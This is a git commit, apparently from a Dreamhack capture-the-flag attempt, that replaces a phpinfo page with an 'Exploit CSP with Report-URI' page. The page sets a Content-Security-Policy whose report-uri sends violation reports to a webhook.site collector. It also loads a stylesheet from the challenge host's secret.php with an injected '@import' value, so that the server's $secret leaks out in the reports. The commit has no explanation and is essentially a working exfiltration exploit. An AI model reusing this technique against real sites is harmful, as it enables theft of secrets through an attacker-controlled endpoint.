cb27ecaa41adb82ffdeb7ffb27de45335e98fd68
tadokun468 <huynhluc258@gmail.com>
2024-12-03 21:42:29 +0700

    a

--- src/index.php
+++ src/index.php
@@ -1,3 +1,17 @@
-<?php 
-  phpinfo();
+<?php
+header("Content-Security-Policy: default-src 'self'; style-src 'self'; report-uri https://webhook.site/2b0e8e28-cd46-4434-b0d0-eb7f190b7ed7;");
 ?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit CSP with Report-URI</title>
+    <!-- Tải file CSS chứa nội dung `$secret` -->
+    <link rel="stylesheet" href="http://host3.dreamhack.games:15346/secret.php?whatUwant=@import '">
+</head>
+<body>
+    <h1>Exploitation in Progress...</h1>
+</body>
+</html>
